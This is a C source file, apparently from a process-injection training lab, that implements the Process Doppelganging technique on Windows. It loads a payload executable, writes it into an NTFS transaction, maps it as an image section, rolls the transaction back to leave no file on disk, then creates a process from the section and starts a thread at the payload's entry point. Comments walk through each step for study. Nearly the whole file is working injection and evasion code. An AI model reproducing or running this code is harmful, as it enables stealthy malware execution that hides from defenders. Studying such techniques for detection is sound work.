#include <windows.h>
#include <stdio.h>
#include "dopple.h"

// helper function - GetPayloadBuffer
BYTE* GetPayloadBuffer(OUT size_t& p_size) {
    HANDLE hFile = CreateFileW(L"C:\\Users\\vagrant\\Desktop\\CPIA-Work\\ProcessInjection\\ProcessDoppleganging\\Payload64\\payload64.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE) {
        perror("[-] Unable to open the payload file...\n");
        exit(-1);
    }
    p_size = GetFileSize(hFile, 0);
    BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (bufferAddress == NULL) {
        perror("[-] Failed to allocate memory to the payload buffer...\n");
        exit(-1);
    }
    DWORD bytesRead = 0;
    if(!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL)) {
        perror("[-] Failed to read the payload buffer.... \n");
        exit(-1);
    }
    return bufferAddress;
}

// Step -1 : Transact
BOOL CreateNTFSTransaction(OUT HANDLE &phTransaction, OUT HANDLE &phTransactedFile) {
    // this is the API which is responsbile for creating the transaction object.
    _NtCreateTransaction pNtCreateTransaction = (_NtCreateTransaction)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateTransaction");
    if (pNtCreateTransaction == NULL) {
        perror("[-] Failed to resolve NtCreateTranscation api\n");
        exit(-1);
    }
    HANDLE hTransaction = NULL;
    HANDLE hFileTransacted = INVALID_HANDLE_VALUE;
    _OBJECT_ATTRIBUTES objAttr;
    WCHAR targetPath[MAX_PATH];
    lstrcpyW(targetPath, L"C:\\temp\\mynotes.txt");

    printf("[+] Transact\n");
    // Create NTFS transaction object - a macro
    InitializeObjectAttributes(&objAttr, NULL, 0 , NULL, NULL);
    // creating the transaction handle. This can be observed in the system informer -> Handles and in the type column, it shows as 'tmTx'
    // hTransaction should show the handle value in the system informer.
    pNtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &objAttr, NULL, NULL, 0, 0, 0, NULL, NULL);
    if (hTransaction == NULL) {
        perror("[-] Error creating transaction... \n");
        exit(-1);
    }
    printf("[+] NTFS transaction object created\n");

    // open target file for transaction. This API takes in the handle to the transcation as a function parameter.
    // The value of the hFileTransacted can be see under the handle value of the system informer.
    hFileTransacted = CreateFileTransactedW(targetPath, GENERIC_READ | GENERIC_WRITE, 0, NULL,
    OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
    // at this point, in the system informer, handle tab for this current process, you should be able to see a file handle to 
    // this ficticious file. Note that c:\temp\mynotes.txt does not exist. the directory c:\temp exists though.
    wprintf(L"[+]\t Opened dummy file: %s\n", targetPath);
    if (hFileTransacted == INVALID_HANDLE_VALUE) {
        printf("[-]\t error opening dummy file for transaction %d\n", GetLastError());
        exit(-1);
    }

    phTransaction = hTransaction;
    phTransactedFile = hFileTransacted;
    return TRUE;
}

// Load - the second step of process doppelganging technique
HANDLE CreateSectionFromTransacedFile(HANDLE hFileTransacted) {
    printf("[+] Load\n");
    _NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
    HANDLE hSection = NULL;
    if (pNtCreateSection == NULL) {
        perror("[-] Failed to resolve NtCreateSection api ...\n");
        exit(-1);
    }
    // SEC IMAGE - mapping the transacted file to an execuable image. This performs PE header validation.
    // Note how the last param of the function is a handle to a transaction to the dummy file which is in-memory not disk.
    // additionally note that the created section pointing to the dummy file is visible in the system informer -> handles
    pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0 , PAGE_READONLY, SEC_IMAGE, hFileTransacted);
    if (hSection == NULL) {
        perror("[-] Error creating section from the transacted file\n");
        exit(-1);
    }
    printf("[+]\t Created section from transacted file\n");
    return hSection;
}

// Step 3 - Rollback file transaction
// Since we have now created the section (step 2) which is required for NtCreateProcessEx, we do not need the transaction file (mynote.txt) anymore.
// If in system informed -> handles, right click on the created section of step 2, and click 'Read/Write process memory', we can see the payload copied.
// Thus, we rollback and we should see that the 
BOOL RollbackTransaction(HANDLE hTransaction) {
    printf("[+] Rollback transaction\n");
    NTSTATUS status;
    _NtRollbackTransaction pNtRollbackTransaction = (_NtRollbackTransaction)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRollbackTransaction");
    if (pNtRollbackTransaction == NULL) {
        perror("[-]\t Failed to resolve the NtRollbackTransaction api\n");
        exit(-1);
    }

    status = pNtRollbackTransaction(hTransaction, TRUE);
    if(!NT_SUCCESS(status)){
        perror("[-] Failed to rollback the transaction\n");
        exit(-1);
    }

    printf("[+]\t Transaction rolled back\n");
    return TRUE;
}

BOOL ProcessDoppleganging(BYTE *payloadBuffer, DWORD payloadSize) {
    // init necessary variables
    HANDLE hTransaction = NULL;
    HANDLE hTransactedFile = INVALID_HANDLE_VALUE;
    HANDLE hSection = NULL;
    HANDLE hProcess = NULL;
    DWORD bytesWritten = 0;
    DWORD returnLength = 0;
    ULONG_PTR entryPoint = 0;
    PEB* remotePEB;
    UNICODE_STRING uTargetFile;
    PRTL_USER_PROCESS_PARAMETERS processParameters = NULL;
    NTSTATUS status;
    PROCESS_BASIC_INFORMATION pbi;
    HANDLE hThread;
    // resolving requisite NT apis
    _NtCreateProcessEx pNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateProcessEx");
    if (pNtCreateProcessEx == NULL) {
        perror("[-] Unable to resolve NtCreateProcessEx API... \n");
        exit(-1);
    }
    _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    if (pNtQueryInformationProcess == NULL) {
        perror("[-] Unable to resolve NtQueryInformationProcess API... \n");
        exit(-1);
    }
    _NtReadVirtualMemory pNtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");
    if (pNtReadVirtualMemory == NULL) {
        perror("[-] Unable to resolve NtReadVirtualMemory API... \n");
        exit(-1);
    }
    _RtlImageNTHeader pRtlImageNTHeader = (_RtlImageNTHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");
    if (pRtlImageNTHeader == NULL) {
        perror("[-] Unable to resolve RtlImageNTHeader API... \n");
        exit(-1);
    }
    _RtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateProcessParametersEx");
    if (pRtlCreateProcessParametersEx == NULL) {
        perror("[-] Unable to resolve RtlCreateProcessParametersEx API... \n");
        exit(-1);
    }
    _RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
    if (pRtlInitUnicodeString == NULL) {
        perror("[-] Unable to resolve RtlInitUnicodeString API... \n");
        exit(-1);
    }
    _NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    if (pNtCreateThreadEx == NULL) {
        perror("[-] Unable to resolve NtCreateThreadEx API... \n");
        exit(-1);
    }
    _NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    if (pNtAllocateVirtualMemory == NULL) {
        perror("[-] Unable to resolve NtAllocateVirtualMemory API... \n");
        exit(-1);
    }
    _NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    if (pNtWriteVirtualMemory == NULL) {
        perror("[-] Unable to resolve NtWriteVirtualMemory API... \n");
        exit(-1);
    }
    _ZwClose pZwClose = (_ZwClose)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwClose");
    if (pZwClose == NULL) {
        perror("[-] Unable to resolve ZwClose API... \n");
        exit(-1);
    }
    WCHAR targetExe[MAX_PATH];
    lstrcpyW(targetExe, L"C:\\temp\\mynotes.txt");

    // Doppelganging step - 1 : Transact
    CreateNTFSTransaction(hTransaction, hTransactedFile);

    // Write payload buffer into the transaction
    // note that we are writing the payload buffer (malicious content) to the file (C:\\temp\\mynotes.txt) created via transaction handle
    // this file does not exist on the disk!
    // only if the transaction were commited would the file c:\\temp\\mynotes.txt would be written to the disk. but here, we do not commit the transaction.
    // as we would see later, we would infact rollback the transaction leaving no trace on disk.
    if(!WriteFile(hTransactedFile, payloadBuffer, payloadSize, &bytesWritten, NULL)) {
        perror("[-] Failed to write payload to the transaction\n");
        exit(-1);
    }
    printf("[+]\t payload written to the transaction file\n");
    // Beginning of step - 2 : Load
    // create a section in the transacted file
    // This section will form the base for the new process.
    hSection = CreateSectionFromTransacedFile(hTransactedFile);
    if (hSection == NULL) {
        perror("[-]\t Invalid section handle\n");
        exit(-1);
    }

    // Step 3 - Rollback. Since the payload is loaded inside the section, the payload inside the transaction is no longer necessary.
    // thus, rollback the transaction.
    RollbackTransaction(hTransaction);

    // close handles
    pZwClose(hTransaction); // closes the transaction handle, visible in system informer -> handles tab
    hTransaction = NULL;
    CloseHandle(hTransactedFile); // closes handle to the file transaction, visible in system informer.
    hTransactedFile = INVALID_HANDLE_VALUE;

    // Step 4 - Animate. The core of the doppelganging technique. At this point, we have the section to the dummy file which has the payload loaded into it.
    // first, create a process with transacted section. The parent process is the current process and we inherit the handles into it. the section handle cannot be passed in the NtCreateUserProcess API.
    printf("[+] Animate\n");
    
    status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
    if (!NT_SUCCESS(status)) {
        printf("[-]\t Error creating process from section: %d\n", GetLastError());
        exit(-1);
    }
    printf("[+]\t Successfully created process from section\n"); // if successful, you should see this child process in the main menu of system informer, as a child to the current process as a drop-down. Usually it wont have any name at this point.
    // for this empty-named process, you can then right click on system informer and then select 'General' tab to view process params which would be empty at this point.
    // we cannot spawn a new thread in the process as that would need populating the process params.

    // next, get the process params / information inside the 'pbi' variable.
    status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
    if (!NT_SUCCESS(status)) {
        printf("[-]\t Error querying process information: %d\n", GetLastError());
        exit(-1);
    }

    // next, get entry point from the loaded PEB
    BYTE imageData[0x1000];
    ZeroMemory(imageData, sizeof(imageData));
    // in the api call below, check the memory region of the pbi.PebBaseAddress by navigating to the properties of the unnamed child process and clicking memory tab and inspecting the memory address.
    status = pNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &imageData, 0x1000, NULL); // what we are really interested in is getting information of the PEB.
    if (!NT_SUCCESS(status)) {
        printf("[-]\t Error reading process memory: %d\n", GetLastError());
        exit(-1);
    }
    printf("[+]\t Base address of the target process PEB: %p\n", (ULONG_PTR)(((PPEB)imageData)->ImageBaseAddress)); // right click on the (PPEB)imageData -> add to watch to inspect as api's progress. The image Base address is also visible under the 'memory' tab if you compare the address.
    entryPoint = (pRtlImageNTHeader(payloadBuffer))->OptionalHeader.AddressOfEntryPoint; // entryPoint address is needed to execute the payload. Payload buffer is passed from the current process and not the remote one.
    printf("[+]\t Image base address of payload buffer in target process: %p\n", entryPoint); // this is still a relative address.
    entryPoint += (ULONG_PTR)((PPEB)imageData)->ImageBaseAddress; // we add the entry point with the image base to get the exact entry point address.
    printf("[+]\t Entry point of the payload buffer: %p\n", entryPoint);

    WCHAR targetPath[MAX_PATH];
    lstrcpyW(targetPath, L"C:\\temp\\mynotes.txt"); // this is used as a path to be filled in the process params. we can set it to anything...
    // now process params need to be created to allow us future thread creation.
    pRtlInitUnicodeString(&uTargetFile, targetPath);
    status = pRtlCreateProcessParametersEx(&processParameters, &uTargetFile, NULL, NULL, 
    &uTargetFile, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED); // explore this api in pinvoke.net website. current we set the image path name and the command line in the process parameter.
    if (!NT_SUCCESS(status)) {
        printf("[-]\t Error creating process parameters: %d\n", GetLastError());
        exit(-1);
    }
    printf("[+]\t Process parameters created\n"); // this would be visible in the 'General' tab of the nameless process eventually -- could not see when working.

    // copy these params to the target process memeory
    PVOID paramBuffer = processParameters;
    SIZE_T paramSize = processParameters->EnvironmentSize +  processParameters->MaximumLength;
    status = pNtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &paramSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // again, inspect this address in the memory tab of the name-less child.
    if (!NT_SUCCESS(status)) {
        printf("[-]\t Error allocating memory for the params : %d\n", GetLastError());
        exit(-1);
    }
    printf("[+]\t allocated memory for the process params: %p\n", paramBuffer);

    size_t xBytesWritten = 0;
    status = pNtWriteVirtualMemory(hProcess, processParameters, processParameters, 
                                    processParameters->EnvironmentSize +  processParameters->MaximumLength, NULL); // in the memory page you should see the 'processParameters' address written in the allocated memory.
    if (!NT_SUCCESS(status)) {
        printf("[-]\t Error writing process params");
        exit(-1);
    }
    printf("[+]\t Process params written to the process at the address: %p\n", processParameters);

    // write the above extracted the process parameters in the PEB at location 0x20 offset of the PEB.
    // you can find the PEB in the 'memory' tab of the nameless process.
    // 0x20 offset info from: https://www.vergiliusproject.com/kernels/x64/Windows%2010%20|%202016/2210%2022H2%20(May%202023%20Update)/_PEB
    remotePEB = (PEB *)pbi.PebBaseAddress; // add this to watch and it's 0x20 offset is the process parameter
    if(!WriteProcessMemory(hProcess, &remotePEB->ProcessParameters, &processParameters, sizeof(PVOID), NULL)){
        perror("[-]\t Error updating the process parameters\n"); // 0x20 is written now with 'processParams' address
        exit(-1);
    }
    printf("[+]\t updated the PEB 0x20 offset address with the process parameter's address\n");

    // now, we can create the thread. But since this technique is dead, the detection logic checks for the FileExtensionObject and blocks the call.
    status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE) entryPoint, NULL, FALSE, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[-]\t Failed creating thread: %x\n", GetLastError());
        exit(-1);
    }
    printf("[+]\t Thread executed\n");
    return TRUE;
}


int main() {
    size_t payloadSize = 0;
    BYTE* payloadBuffer = GetPayloadBuffer(payloadSize);
    BOOL isSuccess = ProcessDoppleganging(payloadBuffer, (DWORD)payloadSize);
    //system("pause");
}